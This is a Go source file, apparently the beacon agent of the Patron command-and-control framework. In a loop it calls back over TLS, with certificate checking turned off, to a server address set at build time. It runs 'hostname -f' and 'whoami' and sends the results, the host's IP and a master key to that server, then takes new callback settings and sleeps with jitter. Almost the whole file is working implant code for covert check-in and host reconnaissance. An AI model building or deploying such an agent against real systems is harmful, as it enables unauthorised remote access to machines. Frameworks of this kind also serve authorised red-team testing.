package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
)

func main() {
	Init()
	config, err := loadCertificate()
	if err != nil {
		log.Fatalf("Failed to load certificate: %v\n", err)
	}

	agentID, hostname, username := generateAgentMetadata()

	for {
		beacon, err := establishConnection(config)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := getLocalIP(beacon)
		err = sendConfigurationRequest(beacon, agentID, hostname, username, ip)
		if err != nil {
			logger.Logf(logger.Error, "Error sending configuration request: %v", err)
			beacon.Close()
			time.Sleep(2 * time.Second)
			continue
		}

		logger.Logf(logger.Info, "Beacon successful")

		sleepInterval := calculateSleepInterval()
		time.Sleep(time.Second * time.Duration(sleepInterval))
	}
}

func Init() {
	enableLogging := true
	logger.EnableLogging(enableLogging)
	err := logger.SetLogFile("app.log")
	if err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
	}
	gob.Register(types.Request{})
    gob.Register(types.ConfigurationRequest{})
    gob.Register(types.ConfigurationResponse{})
}

func loadCertificate() (*tls.Config, error) {
	publickey, err := base64.StdEncoding.DecodeString(RootCert)
	if err != nil {
		return nil, err
	}

	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(publickey) {
		return nil, fmt.Errorf("failed to parse root certificate")
	}
	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
}

func generateAgentMetadata() (string, string, string) {
	agentID := uuid.New().String()
	hostname, err := exec.Command("hostname", "-f").Output()
	if err != nil {
		hostname = []byte("unknown-host")
	}
	username, err := exec.Command("whoami").Output()
	if err != nil {
		username = []byte("unknown-user")
	}
	return agentID, strings.TrimSpace(string(hostname)), strings.TrimSpace(string(username))
}

func establishConnection(config *tls.Config) (*tls.Conn, error) {
	beacon, err := tls.Dial("tcp", ServerIP+":"+ServerPort, config)
	if err != nil {
		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
	}
	return beacon, err
}

func getLocalIP(beacon *tls.Conn) string {
	ipAddress := beacon.LocalAddr().(*net.TCPAddr)
	return fmt.Sprintf("%v", ipAddress)
}

func sendConfigurationRequest(beacon *tls.Conn, agentID, hostname, username, ip string) error {
    configReq := types.ConfigurationRequest{
        AgentID:           agentID,
        Username:          username,
        Hostname:          hostname,
        AgentIP:           ip,
        ServerIP:          ServerIP,
        ServerPort:        ServerPort,
        CallbackFrequency: CallbackFrequency,
        CallbackJitter:    CallbackJitter,
        MasterKey:         "MASTERKEY",
    }

    request := types.Request{
        Type:    types.ConfigurationRequestType,
        Payload: configReq,
    }

    encoder := gob.NewEncoder(beacon)
    if err := encoder.Encode(request); err != nil {
        return err
    }

    var response types.Response
    decoder := gob.NewDecoder(beacon)
    if err := decoder.Decode(&response); err != nil {
        return err
    }

    if response.Type == types.ConfigurationResponseType {
        configResponse, ok := response.Payload.(types.ConfigurationResponse)
        if !ok {
            return fmt.Errorf("unexpected payload type")
        }

        updateClientConfig(configResponse)
    } else {
        return fmt.Errorf("unexpected response type: %v", response.Type)
    }
    return nil
}

func updateClientConfig(config types.ConfigurationResponse) {
    if config.ServerIP != ServerIP {
		logger.Logf(logger.Info, "Updating callback IP")
        ServerIP = config.ServerIP
    }
    if config.ServerPort != ServerPort {
		logger.Logf(logger.Info, "Updating callback port")
        ServerPort = config.ServerPort
    }
    if config.CallbackFrequency != CallbackFrequency {
		logger.Logf(logger.Info, "Updating callback frequency")
        CallbackFrequency = config.CallbackFrequency
    }
    if config.CallbackJitter != CallbackJitter {
		logger.Logf(logger.Info, "Updating callback jitter")
        CallbackJitter = config.CallbackJitter
    }
}

func calculateSleepInterval() float64 {
	frequency, _ := strconv.Atoi(CallbackFrequency)
	jitter, _ := strconv.Atoi(CallbackJitter)
	jitterPercent := float64(jitter) * 0.01
	baseTime := float64(frequency)
	rand.Seed(time.Now().UnixNano())
	variance := baseTime * jitterPercent * rand.Float64()
	return baseTime - (jitterPercent * baseTime) + 2*variance
}
